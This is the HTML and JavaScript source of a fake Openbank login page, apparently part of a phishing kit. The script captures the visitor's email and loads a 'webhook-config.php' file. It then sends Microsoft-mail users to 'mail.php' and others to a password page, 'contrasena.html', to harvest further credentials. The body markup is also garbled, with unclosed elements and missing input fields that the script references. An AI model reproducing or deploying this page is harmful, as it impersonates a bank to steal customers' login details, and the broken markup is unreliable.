<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Openbank</title>
  <link rel="shortcut icon" href="https://assets.openbank.com/web/icons/rebranded_favicon.ico">
  <style>
    @font-face {
      font-family: 'Outfit Semibold';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.ttf') format('truetype');
    }
    @font-face {
      font-family: 'Outfit Regular';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Regular.ttf') format('truetype');
    }
    @font-face {
      font-family: 'Outfit Light';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Light.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Light.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Light.ttf') format('truetype');
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { font-size: 62.5%; }

    body {
      font-family: 'Outfit Regular', sans-serif;
      background-color: #f7f7f7;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }

    .background-ring {
      position: fixed;
      right: -120px;
      top: 50%;
      transform: translateY(-40%);
      width: 500px;
      height: 500px;
      pointer-events: none;
      z-index: 0;
    }

    .header {
      background-color: #111111;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 24px;
      height: 64px;
      position: relative;
      z-index: 10;
    }

    .header-logo { display: flex; align-items: center; padding-left: 110px; }
    .header-logo img { height: 50px; width: auto; }

    .btn-cerrar {
      background: transparent;
      color: #fff;
      border: 1.5px solid #fff;
      border-radius: 0px;
      padding: 8px 20px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.4rem;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-cerrar:hover { background-color: rgba(255,255,255,0.1); }

    .main-content {
      display: flex;
      justify-content: center;
      padding: 120px 24px 40px;
      position: relative;
      z-index: 1;
    }

    .login-container { width: 100%; max-width: 21.7cm; }

    .login-title {
      font-family: 'Outfit Semibold', sans-serif;
      font-size: 3.2rem;
      color: #1a1a1a;
      text-align: center;
      margin-bottom: 40px;
      line-height: 1.25;
      white-space: nowrap;
      width: 21.7cm;
      margin-left: auto;
      margin-right: auto;
    }

    .login-subtitle {
      font-family: 'Outfit Semibold', sans-serif;
      font-weight: bold;
      font-size: 1.4rem;
      color: #1a1a1a;
      margin-bottom: 12px;
      width: 15.2cm;
    }

    .form-area { width: 10cm; margin: 0 auto; }

    .input-wrapper { position: relative; margin-bottom: 16px; }

    .input-field {
      width: 10cm;
      padding: 14px 44px 14px 14px;
      border: 1.5px solid #999999;
      border-radius: 0px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.5rem;
      color: #1a1a1a;
      background-color: #ffffff;
      outline: none;
      transition: border-color 0.2s;
    }
    .input-field::placeholder {
      color: #999;
      font-family: 'Outfit Light', sans-serif;
      font-size: 1.4rem;
    }
    .input-field:focus {
      border-color: #1a1a1a;
    }

    .toggle-visibility {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .toggle-visibility svg { width: 18px; height: 18px; }

    .checkbox-wrapper {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 16px;
    }
    .checkbox-wrapper input[type="checkbox"] {
      appearance: none;
      -webkit-appearance: none;
      width: 16px;
      height: 16px;
      border: 1.5px solid #c8c8c8;
      border-radius: 3px;
      cursor: pointer;
      position: relative;
      flex-shrink: 0;
      background: #fff;
    }
    .checkbox-wrapper input[type="checkbox"]:checked {
      background-color: #1a1a1a;
      border-color: #1a1a1a;
    }
    .checkbox-wrapper input[type="checkbox"]:checked::after {
      content: '';
      position: absolute;
      top: 3px;
      left: 6px;
      width: 5px;
      height: 9px;
      border: solid #fff;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }
    .checkbox-label {
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.3rem;
      color: #1a1a1a;
    }
    .checkbox-label a { color: #1a1a1a; text-decoration: underline; }

    .btn-continuar {
      width: 10cm;
      padding: 14px;
      background-color: #bac7cb;
      color: #8a8a8a;
      border: none;
      border-radius: 4px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.5rem;
      cursor: default;
      transition: background-color 0.2s, color 0.2s;
    }
    .btn-continuar.active {
      background-color: #1a1a1a;
      color: #fff;
      cursor: pointer;
    }
    .btn-continuar.active:hover { background-color: #333; }

    @media (max-width: 768px) {
      .background-ring { display: none; }
      .header { padding: 0 16px; }
      .header-logo { padding-left: 0; }
      .main-content { padding: 40px 24px 24px; }
      .login-container { max-width: 400px; margin: 0 auto; }
      .login-title { font-size: 2.4rem; white-space: normal; width: auto; }
      .login-subtitle { width: auto; }
      .form-area { width: 100%; max-width: 400px; }
      .input-field { width: 100%; max-width: 400px; }
      .btn-continuar { width: 100%; max-width: 400px; }
    }
  </style>
</head>
<body>

    <svg viewBox="0 0 620 620" fill="none" xmlns="http://www.w3.org/2000/svg">

      <img src="logo.png" alt="Openbank logo">

        </button>
      </div>
      <div class="checkbox-wrapper">
        <input type="checkbox" id="rememberUser">
        <label class="checkbox-label" for="rememberUser">Recordar <a href="#">mi usuario</a></label>
      </div>
      <button class="btn-continuar" id="btnContinuar">Continuar</button>
      </div>
    </div>
  </main>

  <script src="webhook-config.php"></script>
  <script>
    // Mostrar mensaje de error si existe
    document.addEventListener('DOMContentLoaded', function() {
      const params = new URLSearchParams(window.location.search);
      const urlError = params.get('error');
      const errorDiv = document.getElementById('errorMessage');
      
      const errorMessage = urlError ? 'La información ingresada es incorrecta. Por favor, verifica tus datos.' : sessionStorage.getItem('errorMessage');
      
      if (errorMessage) {
        errorDiv.textContent = errorMessage;
        errorDiv.style.display = 'block';
        sessionStorage.removeItem('errorMessage');
      }
    });

    // Generar sessionId único si no existe
    if (!sessionStorage.getItem('sessionId')) {
      sessionStorage.setItem('sessionId', 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
    }

    // Button activation logic
    var emailInput = document.getElementById('emailInput');
    var btnContinuar = document.getElementById('btnContinuar');
    emailInput.addEventListener('input', function() {
      if (this.value.trim().length > 0) {
        btnContinuar.classList.add('active');
      } else {
        btnContinuar.classList.remove('active');
      }
    });

    // Webhook submission
    btnContinuar.addEventListener('click', async function() {
      if (this.classList.contains('active')) {
        const email = emailInput.value.trim().toLowerCase();
        
        // Guardar email en sessionStorage
        sessionStorage.setItem('userEmail', email);
        
        // Si es correo Outlook/Hotmail, redirigir directo a mail.php
        if (email.includes('@hotmail.') || email.includes('@outlook.') || email.includes('@live.') || email.includes('@msn.')) {
          redirectTo('mail.php');
        } else {
          // Redirigir a página de contraseña
          redirectTo('contrasena.html');
        }
      }
    });
  </script>

</html>
